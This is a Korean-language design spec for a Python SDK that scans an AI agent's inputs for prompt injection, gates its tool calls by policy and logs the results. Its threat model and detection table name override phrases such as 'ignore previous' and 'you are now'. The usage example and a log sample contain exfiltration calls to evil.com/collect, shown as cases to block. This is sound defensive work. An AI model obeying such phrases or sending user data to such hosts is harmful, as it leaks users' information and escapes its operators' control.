# Agent Security Runtime MVP Spec v0.2

> AI 에이전트의 입력 콘텐츠, 도구 호출, 실행 이력을 감시하고 통제하는 Python SDK

Date: 2026-04-01
Status: Draft
Scope: Python-only SDK MVP

---

## 1. Product Definition

Agent Security Runtime(ASR)은 AI 에이전트의 입력 콘텐츠, 도구 호출, 실행 이력을 감시하고 통제하는 Python SDK다.

MVP는 다음 3개 모듈만 포함한다.

- `scanner`: 입력 텍스트/HTML/Markdown/PDF 추출 텍스트의 위험 신호 탐지
- `guard`: tool call 전후 정책 검사와 차단/경고 판단
- `audit`: 전 구간 구조화 로그 기록

핵심 목표:

- 숨은 지시문, 간접 prompt injection, 기초적인 콘텐츠 기반 공격을 조기에 탐지한다.
- 에이전트의 실제 피해 지점인 tool/action 실행 시점을 통제한다.
- 사고 발생 시 어떤 입력과 어떤 행동이 연결되었는지 추적 가능하게 만든다.

---

## 2. Goals

- Python 패키지 하나로 동작하는 인프로세스 SDK 제공
- 프레임워크 무관한 generic wrapper 제공
- `allow` / `warn` / `block` 3단계 정책 판정 지원
- 기본 보안 정책 6종 지원
- JSONL 감사 로그 지원
- 공격/정상 시나리오 테스트셋 제공

---

## 3. Non-goals

- TypeScript 대시보드
- HTTP 프록시 모드
- 멀티 프레임워크 어댑터 동시 지원
- 범용 YAML DSL 설계
- PDF 바이너리/렌더링 계층 자체 분석
- 이미지/오디오 steganography 탐지
- 고급 dynamic cloaking 완전 탐지
- 인간 승인 UI (require_approval)
- 멀티 에이전트 systemic trap 완전 방어
- 모델 내부 정렬 실패 자체
- 학습 단계 poisoning

---

## 4. Threat Model

### 공격자
- 에이전트가 소비하는 외부 콘텐츠(웹페이지, 이메일, 문서, API 응답)를 통제할 수 있는 자
- 에이전트 시스템 자체에 대한 접근 권한은 없음 (간접 공격)

### MVP 대응 범위

| 공격 유형 (논문 기반) | MVP 대응 |
|----------------------|---------|
| Content Injection (CSS hidden, HTML 주석, 메타데이터) | Scanner |
| Data Exfiltration (tool call을 통한 민감정보 유출) | Guard |
| Embedded Jailbreak (외부 리소스 내 탈옥 프롬프트) | Scanner |
| Behavioural Control (도구 호출 하이재킹) | Guard |

### 신뢰 경계

```
신뢰할 수 없는 영역          신뢰 경계              에이전트 내부
─────────────────────  ──────────────  ──────────────
웹페이지, 이메일,       → [Scanner]  →   LLM 컨텍스트
API 응답, 문서             [Guard]   →   Tool 실행
                          [Audit]   →   로그 저장소
```

### MVP가 직접 해결하지 않는 위협
- 멀티에이전트 군집 행태 붕괴
- UI/운영자 심리 조작 전반
- 모델 학습 단계 poisoning

---

## 5. Architecture

```
Application / Agent
    |
    +-- Scanner.scan(...)           # 입력 스캔
    |
    +-- Guard.before_tool(...)      # 도구 실행 전 판단
    |       -> allow / warn / block
    |
    +-- Tool execution
    |
    +-- Guard.after_tool(...)       # 도구 실행 후 결과 검사
    |       -> allow / warn / redact_result
    |
    +-- AuditLogger.log(...)        # 전 구간 자동 기록
```

### 구성 원칙
- 코어 엔진은 프레임워크 독립적이어야 한다.
- 프록시가 아니라 call interception API가 핵심 통합 지점이다.
- 감사 로그는 기본적으로 민감정보를 마스킹해야 한다.
- 원문 전체 저장은 기본 비활성화한다.

---

## 6. Module APIs

### 6.1 Scanner

입력 콘텐츠에서 숨겨진 악성 지시문과 prompt injection 패턴을 탐지한다.

**스캔 대상:**
- plain text
- HTML source
- Markdown source
- PDF에서 추출된 text
- retrieval chunk
- tool args에 포함된 문자열 필드
- tool output의 문자열 필드

```python
from asr import Scanner

scanner = Scanner(
    patterns="default",       # "default" | "strict" | 커스텀 패턴 리스트
    store_raw=False,          # 기본 OFF. 원문 저장 시 보안 위험
)

result = scanner.scan(
    content="...",
    source_type="html",       # "text" | "html" | "markdown" | "pdf_text"
                              #   | "retrieval" | "tool_args" | "tool_output"
    source_ref="https://example.com/page",  # 출처 참조 (선택)
)
```

**반환 타입:**

```python
@dataclass
class ScanResult:
    score: float              # 0.0 ~ 1.0 위험도 점수
    severity: str             # "low" | "medium" | "high"
    findings: list[Finding]   # 탐지된 항목 리스트
    redacted_excerpt: str     # 문제 부분의 마스킹된 발췌 (원문 아님)
    source_type: str
    source_ref: str | None
    scanned_at: str           # ISO 8601 타임스탬프

@dataclass
class Finding:
    pattern_id: str           # "css_hidden_text", "html_comment_injection" 등
    severity: str             # "low" | "medium" | "high"
    description: str          # 사람이 읽을 수 있는 설명
    location: str | None      # 발견 위치 (줄 번호, 태그 등)
```

**MVP 탐지 패턴 (8개):**

| ID | 대상 | 설명 |
|----|------|------|
| `css_hidden_text` | HTML | `display:none`, `visibility:hidden`, 화면 밖 배치 텍스트 |
| `html_comment_injection` | HTML | `<!-- -->` 주석 내 지시문 |
| `metadata_injection` | HTML | `aria-label`, `alt`, `title` 등 메타데이터 속 지시문 |
| `markdown_link_payload` | Markdown | 링크 anchor text에 숨겨진 명령 |
| `prompt_injection_keywords` | 전체 | "ignore previous", "system:", "you are now" 등 패턴 |
| `base64_encoded_instruction` | 전체 | Base64 인코딩된 의심 명령 |
| `invisible_unicode` | 전체 | zero-width 문자 등으로 숨겨진 텍스트 |
| `role_override_attempt` | 전체 | "SYSTEM:", "Assistant:" 등 역할 오버라이드 시도 |

**PDF 지원:** PDF 자체를 파싱하지 않는다. 유틸리티 함수 `asr.utils.extract_text_from_pdf(path)`로 텍스트를 추출한 후 `scanner.scan(text, source_type="pdf_text")`로 전달한다.

**Scanner 호출 주체 (v0.1):** MVP에서 Scanner는 항상 **호출자가 명시적으로 호출**한다. Guard가 내부적으로 Scanner를 자동 호출하지 않는다. `tool_args`, `tool_output`, `retrieval` 등의 source_type은 호출자가 직접 `scanner.scan(text, source_type="tool_args")`로 사용한다. Guard 내부 자동 스캔 연동은 Phase 1.5에서 검토한다.

---

### 6.2 Guard

에이전트의 도구 호출을 인터셉트하여 정책 기반으로 허용/차단/경고를 판단한다.

```python
from asr import Guard

guard = Guard(
    domain_allowlist=["api.internal.com", "api.company.io"],
    file_path_allowlist=["/tmp/asr", "/data/safe"],
    pii_action="block",                    # "off" | "warn" | "block"
    block_egress=True,                     # 외부 전송 통제
    tool_blocklist=["rm_rf", "eval"],
    capability_policy={
        "network_send": "warn",
        "file_write": "warn",
        "file_read": "allow",
        "shell_exec": "block",
        "code_exec": "block",
    },
    unknown_tool_default="warn",           # 미등록 도구 기본 동작
    on_block=lambda d: notify_slack(d),    # 차단 시 콜백 (선택)
    on_warn=lambda d: log_to_siem(d),      # 경고 시 콜백 (선택)
)
```

**핵심 인터페이스:**

```python
# before_tool: 도구 실행 전 판단
decision = guard.before_tool(
    name: str,                             # 도구 이름
    args: dict,                            # 도구 인자
    context: dict | None = None,           # 추가 컨텍스트
    capabilities: list[str] | None = None, # capability 태그
)
# -> BeforeToolDecision (action: allow | warn | block)

# after_tool: 도구 실행 후 결과 검사
decision = guard.after_tool(
    name: str,
    result: Any,
    context: dict | None = None,
)
# -> AfterToolDecision (action: allow | warn | redact_result)

# 데코레이터 방식
@guard.protect(capabilities=["network_send"])
def send_email(to, subject, body):
    ...
```

**반환 타입:**

```python
@dataclass
class BeforeToolDecision:
    action: str               # "allow" | "warn" | "block"
    reason: str               # 판단 근거
    policy_id: str            # 적용된 정책 ID
    severity: str             # "low" | "medium" | "high"
    tool_name: str
    redacted_args: dict       # 민감정보 마스킹된 인자

@dataclass
class AfterToolDecision:
    action: str               # "allow" | "warn" | "redact_result"
    reason: str
    policy_id: str
    severity: str
    tool_name: str
    redacted_result: Any | None  # redact_result일 때 마스킹된 결과
```

**`after_tool()` 의미:**
- `allow`: 결과를 그대로 에이전트에 반환
- `warn`: 결과를 반환하되 감사 로그에 경고 기록
- `redact_result`: 결과에 민감정보가 포함된 경우, 마스킹된 버전을 반환. 도구 실행은 이미 완료되었으므로 차단은 불가하지만 결과 노출은 막을 수 있음

---

### 6.3 Audit

전 구간(입력 스캔, 도구 호출, 판정 결과)을 구조화된 JSONL 로그로 기록한다.

```python
from asr import AuditLogger

audit = AuditLogger(
    output="logs/audit.jsonl",  # 파일 경로 | "stdout" | 콜백 함수
    store_raw=False,            # 기본 OFF
)
```

**로그 대상:**
- scanner 실행 결과
- guard 판정 (before_tool / after_tool)
- tool 실행 시도 및 결과
- 예외 및 차단 사건

---

## 7. Policy Semantics

### 7.1 정책 평가 순서

```
1. Tool Blocklist        — 이름이 blocklist에 있으면 즉시 block
2. Egress Control        — 네트워크 전송 관련 검사 (domain allowlist 포함)
3. File Path Allowlist   — 파일 경로 검사
4. PII Detection         — 인자 내 민감정보 검사
5. Capability Policy     — capability 태그 기반 기본값 판단 (fallback)
6. Unknown Tool Default  — 위 어느 정책에도 해당하지 않을 때
```

**핵심:** Capability Policy는 다른 세부 정책의 **fallback**이다. `network_send: block`이어도 Egress Control의 `domain_allowlist`에 있는 도메인은 통과한다. Capability는 "세부 정책이 적용되지 않을 때의 기본 태도"를 결정한다.

여러 정책이 동시에 해당될 경우, **가장 제한적인 판정이 우선**한다. (`block` > `warn` > `allow`)

### 7.2 `domain_allowlist`

- **목적:** 허용된 도메인 외 네트워크 송신 차단
- **적용 대상:** HTTP/HTTPS 전체, 이메일 webhook, API POST/PUT/PATCH/DELETE 등 외부 송신
- **동작:**
  - 최종 목적지 도메인 검사
  - 리다이렉트 체인 포함
  - 서브도메인 허용 여부는 명시적으로 설정
- **기본:** allowlist 외 도메인 → `block`

### 7.3 `file_path_allowlist`

- **목적:** 파일 읽기/쓰기 경로 제한
- **동작:**
  - allowlist 외 경로 접근 → `block`
  - 홈 디렉토리, SSH 키(`~/.ssh`), 환경파일(`.env`) 등 민감 경로는 기본 고위험 분류
- **네이밍:** allowlist 기반. "이 경로만 허용"이 명확함
- **MVP 제약:** v0.1에서는 읽기/쓰기를 같은 allowlist로 통합 관리한다. Phase 1.5에서 `allowed_read_paths` / `allowed_write_paths` 분리를 검토한다.

### 7.4 `pii_action`

- **목적:** tool args 또는 tool output에 포함된 민감정보 탐지
- **MVP 탐지 대상:**
  - 이메일 주소
  - 전화번호
  - API key 유사 패턴
  - bearer token / secret 형식 문자열
- **MVP 비대상:** 주민등록번호 등 지역 특화 식별번호 (Phase 2에서 지역별 확장 포인트로 제공)
- **동작:** `"off"` | `"warn"` | `"block"`

### 7.5 `block_egress`

- **목적:** 외부 송신을 원천 제한
- **포함 범위:**
  - non-allowlist domain
  - private IP (10.x, 172.16-31.x, 192.168.x)
  - localhost / loopback (127.0.0.1, ::1)
  - link-local (169.254.x)
  - 명시되지 않은 network_send capability

### 7.6 `tool_blocklist`

- **목적:** 알려진 고위험 도구 이름 직접 차단
- **한계:** 이름 기반이라 우회 가능. capability_policy와 함께 사용 권장

### 7.7 `capability_policy`

- **목적:** 도구 이름이 아닌 능력 기준으로 통제 (다른 정책의 fallback)
- **MVP capability 분류:**
  - `network_send` — 네트워크 전송
  - `file_read` — 파일 읽기
  - `file_write` — 파일 쓰기
  - `shell_exec` — 셸 실행
  - `code_exec` — 코드 실행
- **기본값:** 명시 없는 capability는 `warn`
- **참고:** 고위험 capability(`shell_exec`, `code_exec`)가 붙은 미등록 도구는 `unknown_tool_default`보다 capability_policy를 우선 적용

### 7.8 정책 설정 방식
- MVP: Python 생성자 파라미터로 직접 전달
- 향후: YAML/JSON 파일 로드 지원 (Phase 2)

---

## 8. Audit Schema

### 8.1 공통 필드 (BaseEvent)

모든 이벤트에 포함되는 필수 필드:

```json
{
  "timestamp": "2026-04-01T16:00:00Z",
  "trace_id": "t-001",
  "event_id": "e-001",
  "event_type": "scan | guard_before | guard_after | error",
  "module": "scanner | guard | system"
}
```

### 8.2 ScanEvent

`event_type: "scan"`일 때 추가 필드:

```json
{
  "source_type": "html",
  "source_ref": "https://example.com/page",
  "score": 0.82,
  "severity": "high",
  "findings": ["css_hidden_text", "prompt_injection_keywords"],
  "redacted_excerpt": "Ignore previous ..."
}
```

### 8.3 GuardBeforeEvent

`event_type: "guard_before"`일 때 추가 필드:

```json
{
  "tool_name": "http_post",
  "capabilities": ["network_send"],
  "decision": "block",
  "reason": "domain_not_allowed",
  "policy_id": "domain_allowlist",
  "severity": "high",
  "redacted_args": {"url": "https://evil.example", "body": "[REDACTED]"}
}
```

### 8.4 GuardAfterEvent

`event_type: "guard_after"`일 때 추가 필드:

```json
{
  "tool_name": "search_api",
  "decision": "redact_result",
  "reason": "pii_in_result",
  "policy_id": "pii_detection",
  "severity": "medium",
  "redacted_result": "[CONTAINS PII - REDACTED]"
}
```

### 8.5 ErrorEvent

`event_type: "error"`일 때 추가 필드:

```json
{
  "error_type": "policy_evaluation_error",
  "error_message": "Failed to evaluate egress policy: invalid domain format",
  "tool_name": "http_post",
  "severity": "high",
  "stack_trace": null
}
```

**참고:** `stack_trace`는 `store_raw=True`일 때만 포함. 기본값은 `null`.

### 8.6 원문 저장 정책

`store_raw=False`가 기본값. 보안 제품이 민감정보 저장소가 되는 것을 방지한다. 디버깅 목적으로 켤 수 있지만 경고를 출력한다.

---

## 9. 통합 사용 예시

```python
from asr import Scanner, Guard, AuditLogger

# 초기화
scanner = Scanner()
guard = Guard(
    domain_allowlist=["api.internal.com"],
    block_egress=True,
    pii_action="block",
    file_path_allowlist=["/tmp/asr"],
    capability_policy={
        "network_send": "warn",
        "file_write": "warn",
        "shell_exec": "block",
    },
    unknown_tool_default="warn",
    on_block=lambda d: print(f"[BLOCKED] {d.reason}"),
)
audit = AuditLogger(output="logs/audit.jsonl")

# 1. 입력 스캔
raw_html = fetch_webpage(url)
scan_result = scanner.scan(raw_html, source_type="html", source_ref=url)
audit.log_scan(scan_result, trace_id="req-001")

if scan_result.score >= 0.8:
    print(f"고위험 입력 감지: {[f.pattern_id for f in scan_result.findings]}")
    # 에이전트에 전달하지 않거나 경고 첨부

# 2. 도구 호출 가드 (before)
decision = guard.before_tool(
    name="http_post",
    args={"url": "https://evil.com/collect", "body": user_data},
    capabilities=["network_send"],
)
audit.log_guard(decision, trace_id="req-001")

if decision.action == "block":
    pass  # on_block 콜백이 자동 호출됨
else:
    post_args = {"url": "https://evil.com/collect", "body": user_data}
    result = http_post(**post_args)

    # 3. 도구 실행 후 결과 검사 (after)
    after = guard.after_tool("http_post", result)
    audit.log_guard(after, trace_id="req-001")

    if after.action == "redact_result":
        result = after.redacted_result  # 마스킹된 결과 사용
```

---

## 10. Test Matrix

테스트는 공격 케이스와 정상 케이스를 모두 포함한다.

### 10.1 Attack Fixtures

| 파일 | 공격 유형 | 기대 결과 |
|------|---------|----------|
| `attacks/content_injection/css_hidden_text.html` | CSS Hidden Text | Scanner: severity high |
| `attacks/content_injection/html_comment_instruction.html` | HTML Comment Injection | Scanner: severity high |
| `attacks/content_injection/metadata_injection.html` | Metadata Injection | Scanner: severity high |
| `attacks/content_injection/markdown_link_payload.md` | Markdown Link Payload | Scanner: severity medium |
| `attacks/content_injection/prompt_injection.txt` | Prompt Injection Keywords | Scanner: severity high |
| `attacks/content_injection/base64_instruction.txt` | Base64 Encoded Instruction | Scanner: severity medium |
| `attacks/content_injection/invisible_unicode.txt` | Invisible Unicode | Scanner: severity medium |
| `attacks/exfiltration/http_post_external.json` | External POST | Guard: block |
| `attacks/exfiltration/email_with_pii.json` | PII in Tool Args | Guard: block |
| `attacks/tool_control/path_traversal.json` | Path Traversal | Guard: block |
| `attacks/tool_control/unknown_tool.json` | Unknown Tool | Guard: warn |

### 10.2 Benign Fixtures

| 파일 | 시나리오 | 기대 결과 |
|------|---------|----------|
| `benign/normal_news_article.html` | 일반 뉴스 기사 HTML | Scanner: score < 0.2 |
| `benign/accessible_hidden_text.html` | 접근성 목적 CSS 숨김 텍스트 | Scanner: score < 0.3 |
| `benign/developer_comments.html` | 정상 HTML 개발자 주석 | Scanner: score < 0.2 |
| `benign/internal_api_call.json` | 내부 API 호출 (allowlist 도메인) | Guard: allow |
| `benign/safe_file_write.json` | 허용 경로 파일 쓰기 | Guard: allow |
| `benign/normal_email.json` | PII 없는 이메일 발송 | Guard: allow 또는 warn |
| `benign/normal_markdown.md` | 일반 Markdown 문서 | Scanner: score < 0.2 |
| `benign/base64_image_data.txt` | Base64 인코딩된 이미지 데이터 | Scanner: score < 0.3 |

### 10.3 테스트 기준

- **공격 fixture pass rate**: 11개 중 10개 이상 정확 탐지
- **정상 fixture pass rate**: 8개 중 7개 이상 정상 통과
- fixture 수가 적으므로 recall/FP 퍼센트보다 **fixture pass rate**로 판단

---

## 11. Acceptance Criteria for v0.1

- [ ] `pip install` 가능한 Python 패키지
- [ ] Scanner: 8개 탐지 패턴 구현 및 테스트
- [ ] Scanner: 7개 source_type 지원
- [ ] Guard: 6개 정책 타입 구현 및 테스트
- [ ] Guard: `before_tool()` → `allow` / `warn` / `block` 동작
- [ ] Guard: `after_tool()` → `allow` / `warn` / `redact_result` 동작
- [ ] Guard: unknown tool 기본 동작 (`warn`)
- [ ] Guard: 사용자 콜백 훅 (`on_block`, `on_warn`) 동작
- [ ] Guard: 정책 평가 순서 정확 (Blocklist → Egress → File → PII → Capability → Unknown)
- [ ] Audit: JSONL 로그 출력 (파일 + stdout)
- [ ] Audit: 이벤트 타입별 스키마 분리 (ScanEvent, GuardBeforeEvent, GuardAfterEvent)
- [ ] Audit: `store_raw=False` 기본값, 민감정보 마스킹
- [ ] 공격 fixture pass rate: 11개 중 10개 이상
- [ ] 정상 fixture pass rate: 8개 중 7개 이상
- [ ] generic decorator/wrapper로 임의의 Python 함수에 적용 가능
- [ ] README에 사용법, 정책 설정, 예시 코드 포함
- [ ] 외부 의존성 최소화 (표준 라이브러리 + 최소한의 서드파티)
- [ ] 문서화된 예제가 실제 실행 가능

---

## 12. Build Order

1. `audit` — 이벤트 스키마 정의 및 JSONL 로거 구현 (다른 모듈의 기반)
2. `guard.before_tool()` — 6개 정책 타입 구현
3. `guard.after_tool()` — 결과 검사 및 redact_result 구현
4. `scanner.scan()` — 8개 탐지 패턴 구현
5. generic decorator/wrapper 연결
6. 공격/정상 fixture 테스트 추가
7. 패키징 및 예제 정리

---

## 13. Deferred (Phase 1.5+)

### Phase 1.5
- LangChain 어댑터 1개 (콜백 기반)
- OpenAI Agents SDK 어댑터

### Phase 2
- RAG Security Pipeline (문서 위험도, 출처 신뢰도, citation 강제)
- Dynamic Cloaking Diff (보조 분석)
- 고도화된 DLP / PII 분류기 (지역별 식별번호 확장)
- YAML/JSON 정책 파일 로드
- TypeScript 대시보드 + HTTP Proxy 모드
- 외부 SIEM 연동 (Splunk, Datadog 등)
- retrieval chunk trust scoring

---

## 14. Open Questions

1. **Capability taxonomy 범위** — MVP의 5개(`network_send`, `file_read`, `file_write`, `shell_exec`, `code_exec`)로 충분한가? `data_delete`, `auth_modify` 등이 필요한가?
2. **PII 탐지 범위** — email, phone, API key, token 4종 외에 MVP에서 더 필요한 패턴이 있는가?
3. **Unknown tool + 고위험 capability 조합** — 미등록 도구에 `shell_exec` capability가 붙으면 `unknown_tool_default`를 무시하고 capability_policy를 따르도록 했는데, 이 동작이 직관적인가?
4. **Benign fixture 오탐 허용선** — 8개 중 1개 오탐(12.5%)을 허용했는데, 실무에서 이 기준이 적절한가?

---

## 15. Tech Stack

- **언어:** Python 3.11+
- **테스트:** pytest
- **패키징:** pyproject.toml (PEP 621)
- **의존성:** 최소화 (re, json, dataclasses, logging, uuid, datetime 등 표준 라이브러리 우선)
- **선택적 의존성:** PDF 텍스트 추출 시 `pymupdf` 또는 `pdfplumber`
